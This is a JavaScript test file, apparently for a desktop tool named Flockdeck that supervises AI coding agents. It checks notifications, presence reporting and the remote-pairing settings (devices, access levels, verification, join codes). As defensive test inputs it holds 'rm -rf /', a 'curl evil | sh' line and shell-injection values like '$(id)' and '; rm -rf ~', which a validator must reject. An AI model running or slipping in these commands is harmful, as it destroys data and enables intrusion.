    assert.equal(opts.indexOf("45 seconds") < opts.indexOf("1 minute"), true, "in order");
    assert.equal(m.container.findAll("img").length, 0);
    assert.ok(m.text().includes(MARKUP));
  }));

test("Notifications: the browser's leave is asked for from the switch and the button, and the words say where it stands", () => {
  const made = [];
  class N {
    constructor(t, o) { made.push([t, o]); }
    close() {}
    static permission = "default";
    static asked = 0;
    static requestPermission() { N.asked++; N.permission = "granted"; return Promise.resolve("granted"); }
  }
  return withPage({ win: { Notification: N } }, async (m) => {
    await m.connect();
    await m.openSettings("notifications");
    assert.match(m.container.find("#set-notifications-about").textContent, /has not been asked yet/);
    await m.click(m.container.find("#set-notifications-ask"));
    assert.equal(N.asked, 1);
    assert.equal(m.container.find("#set-notifications-ask"), null, "granted, nothing to ask");
    assert.doesNotMatch(m.container.find("#set-notifications-about").textContent, /not been asked/);
  });
});

test("Notifications: the page raises one when an agent newly needs you and the window is behind, never for what it asked", () => {
  const made = [];
  class N {
    constructor(t, o) { made.push([t, o]); this.closed = false; N.last = this; }
    close() { this.closed = true; }
    static permission = "granted";
  }
  return withPage({ win: { Notification: N } }, async (m) => {
    const g = graph();
    const first = g.nodes[0];
    await m.connect();
    assert.deepEqual(made, [], "the first state is only remembered");
    const waiting = (status, over = {}) => stateOf(g, { panes: { ...stateOf(g).panes, [first.pane]: { id: first.pane, name: first.name, status, branch: "feat/x", permission: { tool: "Bash", command: "rm -rf /" }, ...over } } });
    await m.push(waiting("waiting"));
    assert.equal(made.length, 1);
    assert.equal(made[0][0], first.name + " needs you");
    assert.equal(made[0][1].body, "feat/x \u2014 waiting for input");
    assert.equal(JSON.stringify(made[0]).includes("rm -rf"), false, "what the agent asked is not in a notification");
    await m.push(waiting("waiting"));
    assert.equal(made.length, 1, "still waiting is not news");
    await m.push(waiting("working"));
    assert.equal(N.last.closed, true, "answered, so the notification is put away");
    await m.push(waiting("blocked"));
    assert.equal(made.length, 2);
    assert.equal(made[1][1].body, "feat/x \u2014 a tool call was blocked");
    // Off in the settings, and nothing is raised.
    await m.push({ type: "prefs", prefs: { notificationsOff: true } });
    await m.push(waiting("working"));
    await m.push(waiting("waiting"));
    assert.equal(made.length, 2);
  });
});

test("Notifications: a second one closes the first instead of leaving it on screen", () => {
  const all = [];
  class N {
    constructor() { this.closed = false; all.push(this); }
    close() { this.closed = true; }
    static permission = "granted";
  }
  return withPage({ win: { Notification: N } }, async (m) => {
    const g = graph();
    const [a, b] = g.nodes;
    await m.connect();
    const st = (over) => stateOf(g, { panes: { ...stateOf(g).panes, ...over } });
    const wait = (n) => ({ [n.pane]: { id: n.pane, name: n.name, status: "waiting", branch: "x", permission: { tool: "Bash", command: "ls" } } });
    await m.push(st(wait(a)));
    await m.push(st({ ...wait(a), ...wait(b) }));
    assert.equal(all.length, 2);
    assert.equal(all[0].closed, true, "the first notification stayed up under the second");
    assert.equal(all[1].closed, false);
  });
});

test("Notifications: a window in front is not interrupted", () => {
  const made = [];
  class N {
    constructor(t, o) { made.push(t); }
    close() {}
    static permission = "granted";
  }
  return withPage({ win: { Notification: N } }, async (m) => {
    m.dom.document.hasFocus = () => true;
    m.dom.document.hidden = false;
    const g = graph();
    await m.connect();
    const first = g.nodes[0];
    await m.push(stateOf(g, { panes: { ...stateOf(g).panes, [first.pane]: { id: first.pane, name: first.name, status: "waiting" } } }));
    assert.deepEqual(made, []);
  });
});

test("Presence: a window on the desk reports real input, and one through the relay says nothing", async () => {
  for (const remote of [false, true]) {
    const listeners = {};
    const doc = { addEventListener(t, f) { (listeners[t] ||= []).push(f); }, removeEventListener(t, f) { listeners[t] = (listeners[t] || []).filter((x) => x !== f); } };
    const m = await mount({ helloOver: { remote } });
    try {
      m.dom.document.addEventListener = doc.addEventListener;
      m.dom.document.removeEventListener = doc.removeEventListener;
      await m.connect();
      for (const f of listeners.keydown || []) f();
      await settle();
      assert.deepEqual(m.sent("presence"), remote ? [] : [{ cmd: "presence", kind: "used" }], remote ? "relay window" : "desk window");
    } finally {
      m.done();
    }
  }
});

// --- Remote, through the page

const ROSTER = {
  type: "remoteDevices", enabled: true, current: "d2",
  devices: [
    { id: "d1", name: "Phone", created: "2026-10-01T00:00:00Z", lastSeen: "2026-10-24T11:59:00Z", fingerprint: "AAAA BBBB", verify: "", role: "full" },
    { id: "d2", name: MARKUP, created: "2026-10-02T00:00:00Z", lastSeen: "2026-10-24T11:00:00Z", deskFingerprint: "CCCC DDDD", deskVerify: "verified", role: "viewer", watchPanes: false },
  ],
  hosts: [{ id: "h1", name: "Desk", online: true, self: true }, { id: "h2", name: "Old laptop", online: false, lastSeen: "2026-09-01T00:00:00Z" }],
  plan: { plan: "trial", name: "Free trial", active: true, ends: "2099-01-01T00:00:00Z" },
};
const TUNNEL = { state: "connected", relay: "https://remote.flockdeck.ai", name: "Desk", viewers: 1 };

test("Remote: not enrolled, the section offers the form, and Enter sends it without the codes folded away", () =>
  withPage({}, async (m) => {
    await m.connect();
    await m.key("Ctrl+Shift+E");
    assert.equal(m.container.findAll(".settings-tab").find((t) => t.attributes.class.includes("is-active")).attributes["data-section"], "remote");
    assert.deepEqual(m.sent("remoteDevices"), [{ cmd: "remoteDevices" }]);
    await m.push({ type: "remoteDevices", enabled: false, devices: [], hosts: [] });
    assert.ok(m.container.find("#remote-enable-box"));
    assert.match(m.container.find("#remote-intro").textContent, /connects out to the relay and listens for nothing/);
    m.clear();
    const relay = m.container.find("#remote-relay");
    relay.value = " https://relay.example.com ";
    relay.dispatch("input");
    await settle();
    m.container.find("#remote-relay").keydown("Enter");
    await settle();
    assert.deepEqual(m.sent("remoteEnable"), [{ cmd: "remoteEnable", relay: "https://relay.example.com", name: "", join: "", invite: "" }]);
    assert.match(m.container.find("#remote-enable").textContent, /Turning it on/);
    assert.equal(isDisabled(m.container.find("#remote-enable")), true, "one request at a time");
    await m.push({ type: "remoteOutcome", action: "enable", error: "the relay refused: " + MARKUP });
    assert.equal(isDisabled(m.container.find("#remote-enable")), false, "the answer frees it");
    assert.ok(m.text().includes("the relay refused: " + MARKUP));
    assert.equal(m.container.findAll("img").length, 0);
    // The codes are folded away until asked for, and sent only then.
    await m.click(m.container.find("#remote-more"));
    for (const [id, v] of [["#remote-join", "J1"], ["#remote-invite", "I1"]]) {
      const f = m.container.find(id);
      f.value = v;
      f.dispatch("input");
      await settle();
    }
    m.clear();
    await m.click(m.container.find("#remote-enable"));
    assert.deepEqual(m.sent("remoteEnable"), [{ cmd: "remoteEnable", relay: "https://relay.example.com", name: "", join: "J1", invite: "I1" }]);
  }));

test("Remote: a relay window that is not enrolled is told it is turned on at the desk, and is offered no form", () =>
  withPage({ helloOver: { remote: true } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push({ type: "remoteDevices", enabled: false, devices: [], hosts: [] });
    assert.equal(m.container.find("#remote-enable-box"), null);
    assert.match(m.container.find("#remote-desk-only").textContent, /turned on, turned off and moved to another relay on the machine Flockdeck runs on/);
  }));

test("Remote: the tunnel, the plan, the devices and the machines are drawn, and names are text", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    assert.match(m.container.find("#remote-status").textContent, /Reachable through remote\.flockdeck\.ai \u2014 1 window is open/);
    assert.match(m.container.find("#remote-plan").textContent, /Free trial: \d+ days left, until 1 January 2099/);
    const devices = m.container.findAll(".remote-row").filter((r) => r.attributes["data-device"]);
    assert.deepEqual(devices.map((r) => r.attributes["data-device"]), ["d1", "d2"]);
    assert.match(devices[0].textContent, /paired .* ago \u00b7 last seen/);
    assert.match(devices[1].textContent, /this device/);
    assert.ok(devices[1].textContent.includes(MARKUP), "a hostile name is text");
    assert.equal(m.container.findAll("img").length, 0);
    const hosts = m.container.findAll(".remote-row").filter((r) => r.attributes["data-host"]);
    assert.match(hosts[0].textContent, /this one/);
    assert.match(hosts[1].textContent, /offline \u2014 last seen/);
    assert.match(m.text(), /A machine that was wiped or lost/);
  }));

test("Remote: Pair a device asks, shows the link once it arrives with its picture and expiry, and a new link replaces it", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    m.clear();
    await m.click(m.container.find("#remote-pair"));
    assert.deepEqual(m.sent("remotePair"), [{ cmd: "remotePair", kind: "device" }]);
    assert.match(m.container.find("#remote-pair").textContent, /Asking the relay/);
    assert.equal(isDisabled(m.container.find("#remote-pair")), true);
    const until = new Date(Date.now() + 5 * 60000).toISOString();
    await m.push({ type: "remotePair", kind: "device", url: "https://remote.flockdeck.ai/p/abc", code: "abc", expiresAt: until, qr: "<svg xmlns='http://www.w3.org/2000/svg'/>" });
    const img = m.container.find(".remote-qr");
    assert.match(img.attributes.src, /^data:image\/svg\+xml;charset=utf-8,/);
    assert.equal(img.attributes.alt, "QR code for the pairing link");
    assert.equal(m.container.find("#remote-link").attributes.value, "https://remote.flockdeck.ai/p/abc");
    assert.match(m.container.find("#remote-link-box").textContent, /It works once, until \d\d:\d\d/);
    assert.match(m.container.find("#remote-left").textContent, /^(5 minutes|4 minutes \d+ seconds?) left$/);
    assert.match(m.container.find("#remote-link-box").textContent, /treat it like a password/);
    assert.match(m.container.find("#remote-pair").textContent, /New link/);
    await m.click(m.container.find("#remote-copy"));
    assert.deepEqual(m.copied, ["https://remote.flockdeck.ai/p/abc"]);
    // A link that came back with an error is the error and no link.
    await m.click(m.container.find("#remote-pair"));
    await m.push({ type: "remotePair", kind: "device", error: "the relay is busy" });
    assert.match(m.text(), /the relay is busy/);
    assert.equal(m.container.find("#remote-link"), null);
  }));

test("Remote: Unpair asks first, and Rename sends the trimmed name and nothing when it is unchanged", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    m.clear();
    const row = (id) => m.container.findAll(".remote-row").find((r) => r.attributes["data-device"] === id);
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Unpair"));
    assert.match(m.container.find(".confirm").textContent, /Unpair Phone\?/);
    assert.match(m.container.find(".confirm").textContent, /Any window it has open will close/);
    assert.deepEqual(m.sent("remoteRevoke"), []);
    await m.click(m.byText(".confirm button", /Cancel/));
    assert.deepEqual(m.sent("remoteRevoke"), []);
    await m.click(row("d2").findAll("button").find((b) => b.textContent === "Unpair"));
    assert.match(m.container.find(".confirm").textContent, /This window will close/, "the device this window is on says so");
    await m.click(m.byText(".confirm button", /^Unpair$/));
    assert.deepEqual(m.sent("remoteRevoke"), [{ cmd: "remoteRevoke", id: "d2" }]);
    // Rename.
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Rename"));
    const field = m.container.find("#remote-rename-field");
    assert.equal(m.dom.document.activeElement, field);
    m.clear();
    field.value = "  Work phone ";
    field.dispatch("input");
    await settle();
    m.container.find("#remote-rename-field").keydown("Enter");
    await settle();
    assert.deepEqual(m.sent("remoteRename"), [{ cmd: "remoteRename", kind: "device", id: "d1", name: "Work phone" }]);
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Rename"));
    m.clear();
    await m.click(m.container.find("#remote-rename-save"));
    assert.deepEqual(m.sent("remoteRename"), [], "the same name sends nothing");
    // Escape puts the field away and leaves the dialog.
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Rename"));
    m.container.find("#remote-rename-field").keydown("Escape");
    await settle();
    assert.equal(m.container.find("#remote-rename-field"), null);
    assert.ok(m.container.find(".settings-panel"));
    // This machine.
    await m.click(m.container.find("#remote-rename"));
    const host = m.container.find("#remote-rename-field");
    host.value = "Studio";
    host.dispatch("input");
    await settle();
    await m.click(m.container.find("#remote-rename-save"));
    assert.deepEqual(m.sent("remoteRename"), [{ cmd: "remoteRename", kind: "host", name: "Studio" }]);
  }));

test("Remote: a device's code is shown on request, marked verified only after a question, and its access is stepped through", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    const row = (id) => m.container.findAll(".remote-row").find((r) => r.attributes["data-device"] === id);
    assert.equal(m.container.find(".remote-code"), null, "hidden until asked for");
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Verify"));
    assert.equal(row("d1").find(".remote-fingerprint").textContent, "AAAA BBBB");
    assert.match(row("d1").find(".remote-code").textContent, /Remote app \u00b7 Not verified/);
    m.clear();
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Mark verified"));
    assert.match(m.container.find(".confirm").textContent, /Only do this if the code above is exactly what Phone shows/);
    assert.deepEqual(m.sent("remoteVerify"), []);
    await m.click(m.byText(".confirm button", /^Mark verified$/));
    assert.deepEqual(m.sent("remoteVerify"), [{ cmd: "remoteVerify", id: "d1", kind: "usual", text: "AAAA BBBB" }], "the code that was on screen goes with it");
    // A verified one offers to take it back, with no question.
    await m.click(row("d2").findAll("button").find((b) => b.textContent === "Verify"));
    assert.match(row("d2").find(".remote-code").textContent, /This desktop's page \u00b7 Verified on the desktop/);
    await m.click(row("d2").findAll("button").find((b) => b.textContent === "Remove verification"));
    assert.deepEqual(m.sent("remoteUnverify"), [{ cmd: "remoteUnverify", id: "d2", kind: "desk" }]);
    // Access steps full -> view artifacts -> view and watch -> full.
    assert.equal(row("d1").find(".remote-access").textContent, "Full access");
    await m.click(row("d1").find(".remote-access"));
    assert.deepEqual(m.sent("setDeviceRole"), [{ cmd: "setDeviceRole", id: "d1", kind: "viewer", watch: false }]);
    // A step that gives more access asks first, and names both levels.
    await m.click(row("d2").find(".remote-access"));
    assert.equal(m.sent("setDeviceRole").length, 1, "nothing is sent before the answer");
    assert.match(m.container.find(".confirm").textContent, /View artifacts only” to “View artifacts and watch panes/);
    await m.click(m.byText(".confirm button", /^Give access$/));
    assert.deepEqual(m.sent("setDeviceRole").pop(), { cmd: "setDeviceRole", id: "d2", kind: "viewer", watch: true });
  }));

test("Remote: the access button names the level it sets, and each step that adds access asks first", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    const watcher = { id: "d3", name: "Tablet", created: "2026-10-03T00:00:00Z", lastSeen: "2026-10-24T11:00:00Z", role: "viewer", watchPanes: true };
    await m.push({ ...ROSTER, devices: [watcher] });
    const button = () => m.container.find(".remote-access");
    assert.equal(button().attributes["aria-label"], "Access for Tablet: View artifacts and watch panes. Press to change it to Full access.");
    m.clear();
    // From watching to full access: one click does not do it.
    await m.click(button());
    assert.deepEqual(m.sent("setDeviceRole"), []);
    await m.click(m.byText(".confirm button", /Cancel/));
    assert.deepEqual(m.sent("setDeviceRole"), [], "backing out sends nothing");
    assert.equal(m.container.find(".confirm"), null);
    await m.click(button());
    assert.match(m.container.find(".confirm").textContent, /Give Tablet more access\?/);
    await m.click(m.byText(".confirm button", /^Give access$/));
    assert.deepEqual(m.sent("setDeviceRole"), [{ cmd: "setDeviceRole", id: "d3", kind: "full", watch: false }]);
  }));

test("Remote: a device whose access is not one of the three is shown as unknown, and is only reset to a known level after a question", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push({ ...ROSTER, devices: [{ id: "d4", name: "Odd", role: "owner" }] });
    const button = m.container.find(".remote-access");
    assert.equal(button.textContent, "Unknown");
    assert.match(button.attributes["aria-label"], /unknown, which the desktop treats as view-only/);
    m.clear();
    await m.click(button);
    assert.deepEqual(m.sent("setDeviceRole"), [], "it is not stepped from");
    assert.match(m.container.find(".confirm").textContent, /Reset access for Odd\?/);
    await m.click(m.byText(".confirm button", /Cancel/));
    assert.deepEqual(m.sent("setDeviceRole"), []);
    await m.click(m.container.find(".remote-access"));
    await m.click(m.byText(".confirm button", /^Reset access$/));
    assert.deepEqual(m.sent("setDeviceRole"), [{ cmd: "setDeviceRole", id: "d4", kind: "viewer", watch: false }]);
  }));

test("Remote: turning it off, removing the machine and moving it each ask first with what stays", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    m.clear();
    await m.click(m.container.find("#remote-disable"));
    const q = m.container.find(".confirm").textContent;
    assert.match(q, /Turn off Flockdeck Remote\?/);
    assert.match(q, /Nothing is deleted: the account, its paired devices and its plan stay/);
    assert.match(q, /90 days/);
    assert.deepEqual(m.sent("remoteDisable"), []);
    await m.click(m.byText(".confirm button", /Cancel/));
    assert.deepEqual(m.sent("remoteDisable"), []);
    await m.click(m.container.find("#remote-disable"));
    await m.click(m.byText(".confirm button", /^Turn off$/));
    assert.deepEqual(m.sent("remoteDisable"), [{ cmd: "remoteDisable" }]);
    assert.match(m.container.find("#remote-disable").textContent, /Turning it off/);
    await m.push({ type: "remoteOutcome", action: "disable" });
    // Remove.
    m.clear();
    await m.click(m.container.find("#remote-remove"));
    assert.match(m.container.find(".confirm").textContent, /The account, its plan, trial, verified email and paired devices stay/);
    assert.match(m.container.find(".confirm").textContent, /remote delete-account in a terminal/);
    await m.click(m.byText(".confirm button", /^Remove this desktop$/));
    assert.deepEqual(m.sent("remoteRemove"), [{ cmd: "remoteRemove", force: false }]);
    await m.push({ type: "remoteOutcome", action: "remove", untold: true, error: "could not reach the relay" });
    assert.ok(m.container.find("#remote-untold"));
    assert.match(m.text(), /could not reach the relay/);
    m.clear();
    await m.click(m.container.find("#remote-forget"));
    assert.match(m.container.find(".confirm").textContent, /keep listing this machine, offline/);
    assert.deepEqual(m.sent("remoteRemove"), []);
    await m.click(m.byText(".confirm button", /^Forget it here$/));
    assert.deepEqual(m.sent("remoteRemove"), [{ cmd: "remoteRemove", force: true }]);
    await m.push({ type: "remoteOutcome", action: "remove" });
    m.clear();
    // Move: the form is folded away, wants a relay, and asks before it sends.
    assert.equal(m.container.find("#remote-move-box"), null);
    await m.click(m.container.find("#remote-move"));
    await m.click(m.container.find("#remote-move-go"));
    assert.match(m.container.find("#remote-problem").textContent, /Name the relay to move this machine to/);
    assert.deepEqual(m.sent("remoteMove"), []);
    const to = m.container.find("#remote-move-relay");
    to.value = "https://relay.example.com";
    to.dispatch("input");
    await settle();
    await m.click(m.container.find("#remote-move-go"));
    assert.match(m.container.find(".confirm").textContent, /Every device paired with it will have to pair again/);
    assert.deepEqual(m.sent("remoteMove"), []);
    await m.click(m.byText(".confirm button", /^Move this machine$/));
    assert.deepEqual(m.sent("remoteMove"), [{ cmd: "remoteMove", relay: "https://relay.example.com", invite: "", join: "" }]);
  }));

test("Remote: turned off with the account kept, it says so, offers to turn on again and does not offer to pair", () =>
  withPage({ extra: { remote: { state: "disabled", relay: "https://remote.flockdeck.ai", name: "Desk" } } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    assert.match(m.container.find("#remote-status").textContent, /Its account is kept/);
    assert.equal(m.container.find("#remote-pair"), null, "a device paired now would find the machine offline");
    assert.equal(m.container.find("#remote-move"), null);
    m.clear();
    await m.click(m.container.find("#remote-resume"));
    assert.deepEqual(m.sent("remoteEnable"), [{ cmd: "remoteEnable", relay: "", name: "", join: "", invite: "" }]);
  }));

test("Remote: a join code is asked for at the desk, shown beside the pairing link and not in place of it", () =>
  withPage({ extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    await m.click(m.container.find("#remote-pair"));
    await m.push({ type: "remotePair", kind: "device", url: "https://r/p/1", expiresAt: new Date(Date.now() + 60000).toISOString() });
    m.clear();
    await m.click(m.container.find("#remote-joincode"));
    assert.deepEqual(m.sent("remotePair"), [{ cmd: "remotePair", kind: "host" }]);
    await m.push({ type: "remotePair", kind: "host", code: "JOIN-42", expiresAt: new Date(Date.now() + 60000).toISOString() });
    assert.match(m.container.find("#remote-join-text").textContent, /flockdeck remote enable -relay https:\/\/remote\.flockdeck\.ai -join JOIN-42/);
    assert.ok(m.container.find("#remote-link"), "the device link is still there");
  }));

test("Remote: a relay window may list, pair, rename and unpair, and is told the rest is the desk's", () =>
  withPage({ helloOver: { remote: true }, extra: { remote: TUNNEL } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    // What is not offered.
    for (const id of ["#remote-disable", "#remote-remove", "#remote-move", "#remote-joincode", "#remote-resume", "#remote-enable-box"]) assert.equal(m.container.find(id), null, id);
    assert.equal(m.container.findAll(".remote-access").length, 0, "no access button");
    assert.match(m.container.find("#remote-desk-only").textContent, /turned on, turned off and moved to another relay on the machine Flockdeck runs on/);
    assert.match(m.text(), /A code for another desktop to join this account is made on the machine Flockdeck runs on/);
    assert.match(m.text(), /What a device may do is set on the machine Flockdeck runs on/);
    assert.match(m.container.find("#remote-verify-help").textContent, /A device is marked verified on the machine Flockdeck runs on/);
    // A code can be looked at but not marked.
    const row = (id) => m.container.findAll(".remote-row").find((r) => r.attributes["data-device"] === id);
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Verify"));
    assert.ok(row("d1").find(".remote-fingerprint"));
    assert.equal(row("d1").findAll("button").some((b) => /Mark verified|Remove verification/.test(b.textContent)), false);
    // What is.
    m.clear();
    await m.click(m.container.find("#remote-pair"));
    assert.deepEqual(m.sent("remotePair"), [{ cmd: "remotePair", kind: "device" }]);
    await m.click(row("d1").findAll("button").find((b) => b.textContent === "Unpair"));
    await m.click(m.byText(".confirm button", /^Unpair$/));
    assert.deepEqual(m.sent("remoteRevoke"), [{ cmd: "remoteRevoke", id: "d1" }]);
    // And the store does not send the rest even if asked.
    for (const c of [{ cmd: "remoteDisable" }, { cmd: "remoteRemove", force: true }, { cmd: "remoteMove", relay: "r" }, { cmd: "remotePair", kind: "host" }, { cmd: "setDeviceRole", id: "d1", kind: "viewer" }, { cmd: "remoteVerify", id: "d1", kind: "usual", text: "x" }]) {
      assert.equal(m.store.send(c), false, c.cmd);
    }
  }));

test("Remote: a tunnel that cannot connect can be tried again", () =>
  withPage({ extra: { remote: { state: "error", relay: "https://r", detail: "no route" } } }, async (m) => {
    await m.connect();
    await m.openSettings("remote");
    await m.push(ROSTER);
    assert.match(m.container.find("#remote-status").textContent, /Cannot reach r: no route/);
    m.clear();
    await m.click(m.container.find("#remote-retry"));
    assert.deepEqual(m.sent("remoteReconnect"), [{ cmd: "remoteReconnect" }]);
    assert.match(m.container.find("#remote-retry").textContent, /Trying/);
    await m.push({ type: "remoteOutcome", action: "reconnect", error: "still no route" });
    assert.match(m.text(), /still no route/);
  }));

// --- Remote on its own, with a clock

async function direct(props) {
  const dom = createDom();
  const restore = install(dom);
  const container = dom.document.createElement("div");
  dom.body.appendChild(container);
  const sent = [];
  const copied = [];
  const base = { status: TUNNEL, roster: { ...ROSTER, seq: 1 }, pair: null, outcome: null, remote: false, send: (c) => { sent.push(c); return true; }, copy: (t) => copied.push(t) };
  const draw = (over) => render(html`<${Remote} ...${{ ...base, ...props, ...over }} />`, container);
  draw();
  await settle();
  return { dom, container, sent, copied, draw, done: () => { render(null, container); restore(); } };
}

test("Remote: the pairing link counts down, the roster is asked for again while it is on screen, and an expired one is taken away", async () => {
  let t = Date.parse("2026-10-24T12:00:00Z");
  const r = await direct({ tickMs: 10, pollMs: 30, clock: () => t });
  try {
    assert.deepEqual(r.sent, [{ cmd: "remoteDevices" }], "asked for on open");
    r.draw({ pair: { type: "remotePair", kind: "device", url: "https://r/p/1", expiresAt: new Date(t + 3000).toISOString(), seq: 1 } });
    await settle();
    assert.equal(r.container.find("#remote-left").textContent, "3 seconds left");
    r.sent.length = 0;
    t += 1000;
    await settle(60);
    assert.equal(r.container.find("#remote-left").textContent, "2 seconds left", "it counts down");
    assert.ok(r.sent.filter((c) => c.cmd === "remoteDevices").length >= 1, "the roster is asked for again so a device paired meanwhile shows up");
    t += 2500;
    await settle(60);
    assert.equal(r.container.find("#remote-link"), null, "no dead link is left to copy");
    assert.equal(r.container.find(".remote-qr"), null);
    assert.match(r.container.find("#remote-expired").textContent, /That pairing link has expired\. Ask for a new one\./);
    assert.match(r.container.find("#remote-pair").textContent, /New link/);
    r.sent.length = 0;
    await settle(60);
    assert.deepEqual(r.sent, [], "it stops asking once the link is gone");
  } finally {
    r.done();
  }
});

test("Remote: a request that could not be sent is said, and not shown as waiting", async () => {
  const r = await direct({ send: () => false });
  try {
    assert.match(r.container.find("#remote-problem").textContent, /could not be sent/);
    r.sent.length = 0;
    r.container.find("#remote-pair").click();
    await settle();
    assert.match(r.container.find("#remote-pair").textContent, /Pair a device/, "still the same button, not Asking the relay");
  } finally {
    r.done();
  }
});

test("remote: a link or code with no expiry is shown for ten minutes from arrival, and a join line is built only from plain text", () => {
  const now = Date.parse("2026-10-24T12:00:00Z");
  const p = { url: "https://x/p/1", expiresAt: "", arrived: now };
  assert.equal(PAIR_CAP_MS, 600000);
  assert.equal(pairLive(p, now + PAIR_CAP_MS - 1), true);
  assert.equal(pairLive(p, now + PAIR_CAP_MS), false);
  assert.equal(pairLive({ code: "abc", expiresAt: "", arrived: now }, now + PAIR_CAP_MS), false, "a join code is held to it too");
  assert.equal(pairLive({ code: "abc", expiresAt: new Date(now + 5000).toISOString(), arrived: now - PAIR_CAP_MS * 2 }, now), true, "its own expiry rules when it has one");
  assert.equal(joinLine("https://remote.flockdeck.ai", "JOIN-42_x"), "flockdeck remote enable -relay https://remote.flockdeck.ai -join JOIN-42_x");
  assert.equal(joinLine("relay.example.com:8443", "abc"), "flockdeck remote enable -relay relay.example.com:8443 -join abc");
  assert.equal(joinLine("", "abc"), "flockdeck remote enable -join abc");
  for (const code of ["x; curl evil | sh", "a b", "$(id)", "a`id`", "a\nb", ""]) assert.equal(joinLine("https://r", code), "", JSON.stringify(code));
  for (const relay of ["r.com; rm -rf ~", "https://r.com/ -x", "r.com\n", "$(id).com", "http://"]) assert.equal(joinLine(relay, "abc"), "", JSON.stringify(relay));
});

test("Remote: an expired join code is taken away, a hostile one is never offered as a command, and the store lets go of both", async () => {
  let t = Date.parse("2026-10-24T12:00:00Z");
  let forgotten = 0;
  const r = await direct({ tickMs: 10, pollMs: 30, clock: () => t, forget: () => { forgotten++; } });
  try {
    r.draw({ pair: { type: "remotePair", kind: "host", code: "JOIN-42", expiresAt: new Date(t + 3000).toISOString(), seq: 1 } });
    await settle();
    assert.match(r.container.find("#remote-join-text").textContent, /-join JOIN-42/);
    t += 4000;
    await settle(60);
    assert.equal(r.container.find("#remote-join-text"), null, "no dead code is left to paste");
    assert.match(r.container.find("#remote-join-expired").textContent, /That join code has expired/);
    assert.ok(forgotten >= 1, "the store is told to drop it");
    r.draw({ pair: { type: "remotePair", kind: "host", code: "x; curl evil | sh", expiresAt: new Date(t + 60000).toISOString(), seq: 2 } });
    await settle();
    assert.equal(r.container.find("#remote-join-text"), null);
    assert.match(r.container.find("#remote-join-bad").textContent, /not plain text/);
    assert.equal(r.container.textContent.includes("curl evil"), false, "it is not printed at all");
    // No expiry at all: shown, then gone after the cap.
    r.draw({ pair: { type: "remotePair", kind: "host", code: "abc", expiresAt: "", seq: 3 } });
    await settle();
    assert.ok(r.container.find("#remote-join-text"));
    t += PAIR_CAP_MS + 1000;
    await settle(60);
    assert.equal(r.container.find("#remote-join-text"), null);
  } finally {
    r.done();
  }
  assert.ok(forgotten >= 2, "and when the dialog closes");
});

test("store: clearPair drops the last pairing answer, and the dialog closing does it", async () => {
  const { store } = await harness();
  store.start();
  const ws = FakeWebSocket.last;
  ws.open();
  ws.frame(hello({}));
  ws.frame({ type: "remotePair", kind: "device", url: "https://r/p/1", qr: "<svg/>", code: "123" });
  assert.equal(store.getState().remotePair.url, "https://r/p/1");
  store.clearPair();
  assert.equal(store.getState().remotePair, null);
  store.stop();
});

test("Remote: the join and invitation codes are password fields and are emptied once sent", async () => {
  const r = await direct({ status: null, roster: { type: "remoteDevices", enabled: false, devices: [], seq: 1 } });
  try {
    await r.container.find("#remote-more").click();
    await settle();
    for (const id of ["#remote-join", "#remote-invite"]) assert.equal(r.container.find(id).attributes.type, "password", id);
    for (const [id, v] of [["#remote-join", "J-1"], ["#remote-invite", "I-1"]]) {
      const el = r.container.find(id);
      el.value = v;
      el.dispatch("input");
    }
    await settle();
    r.sent.length = 0;
    await r.container.find("#remote-enable").click();
    await settle();
    assert.equal(r.sent.length, 1);
    assert.equal(r.container.find("#remote-join").attributes.value, "");
    assert.equal(r.container.find("#remote-invite").attributes.value, "");
  } finally {
    r.done();
  }
});
